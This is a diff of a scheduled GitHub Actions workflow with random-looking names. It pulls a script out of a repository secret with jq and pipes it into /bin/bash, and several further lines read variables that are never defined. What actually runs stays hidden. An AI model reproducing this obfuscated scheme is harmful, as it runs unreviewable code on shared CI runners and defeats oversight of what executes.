@@ -1,32 +1,30 @@
 name: peixuan19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 0/6 * * *'
+    - cron: '36 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: peixuan19871010
         env:
-          h7: ${{ secrets.h7 }}
+          x9: ${{ secrets.x9 }}
         run: |
-          echo $h7 | jq -r .pfx4875 | /bin/bash
-          echo $gov43537 | jq -r .ffqqb5 | /bin/bash
-          echo $t571 | jq -r .tw2 | /bin/bash
-          echo $na32539 | jq -r .mi259 | /bin/bash
-          echo $giaq07569 | jq -r .mqkh953 | /bin/bash
-          echo $ywyyv90 | jq -r .yg01 | /bin/bash
-          echo $tbtw4 | jq -r .gqd74421 | /bin/bash
-          echo $w155 | jq -r .u8 | /bin/bash
-          echo $xyxn3 | jq -r .tj2359 | /bin/bash
-          echo $wxpqv0 | jq -r .ynhiv22046 | /bin/bash
-          echo $rdl1 | jq -r .aahu2 | /bin/bash
-          echo $rsh36135 | jq -r .s9 | /bin/bash
-          echo $kmeax1 | jq -r .j6 | /bin/bash
-          echo $joaq8967 | jq -r .ka4 | /bin/bash
-          echo $pxt60020 | jq -r .oyaiw1636 | /bin/bash
-          echo $ljgi3 | jq -r .prs13724 | /bin/bash
+          echo $x9 | jq -r .swz76 | /bin/bash
+          echo $cp5760 | jq -r .apcz44648 | /bin/bash
+          echo $b578 | jq -r .rxi8 | /bin/bash
+          echo $dxlcr391 | jq -r .tu8 | /bin/bash
+          echo $u38928 | jq -r .pxxa6842 | /bin/bash
+          echo $znzkc93 | jq -r .y9443 | /bin/bash
+          echo $ob09263 | jq -r .qj28 | /bin/bash
+          echo $fgiz050 | jq -r .uip9293 | /bin/bash
+          echo $qgol49689 | jq -r .ld967 | /bin/bash
+          echo $es64 | jq -r .ydox543 | /bin/bash
+          echo $t0275 | jq -r .vph88 | /bin/bash
+          echo $kgk784 | jq -r .a87 | /bin/bash
 
